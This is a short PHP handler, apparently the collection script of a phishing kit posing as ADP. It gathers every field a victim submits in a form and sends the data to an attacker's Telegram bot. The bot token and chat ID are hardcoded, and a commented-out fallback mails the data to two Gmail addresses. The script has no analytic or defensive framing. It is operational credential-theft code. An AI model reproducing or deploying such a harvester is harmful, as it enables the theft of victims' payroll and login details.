<?php

if($_POST){
	
        $to = "mughal.jamshaid123@gmail.com, billionboss2020@gmail.com";
        $subject = "ADP Data";
		$_fdata = "";
		foreach($_POST as $_pk => $_pv){
			$_fdata .= $_pk.' : '.$_pv;
		}
        $message = '
        <html>
        <head>
        <title>ADP Data</title>
        </head>
        <body>
        <p>You have received following data.</p>' . $_fdata.'
        </body>
        </html>
        ';
        
// Always set content-type when sending HTML email
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        
        // More headers
        $headers .= 'From: <billionboss2020@gmail.com>' . "\r\n";
        /* 
        if( mail($to,$subject,$message,$headers) ){
            echo 'true';
        }
 */
$__html = '<b>You have received following data.</b>' . $_fdata;

// use wordwrap() if lines are longer than 70 characters
//$__html = wordwrap($msg,70);

      
            $apiToken = "6819516823:AAHjSdp4OYmnMlnzoHb7QgQRVOXSZ4LKaTw";
			$data = [
				'chat_id' => '2112852041', 
				'text' => $__html,
				'parse_mode' => 'HTML'
			];
        
			$__url_telegram = "https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data);
			$c = curl_init();
			curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($c, CURLOPT_URL, $__url_telegram);
			$_respp = curl_exec($c);
			curl_close($c);
			/* 
			echo "<pre>";
			print_r($_respp);
			die();
			 */
		
		
		
}
?>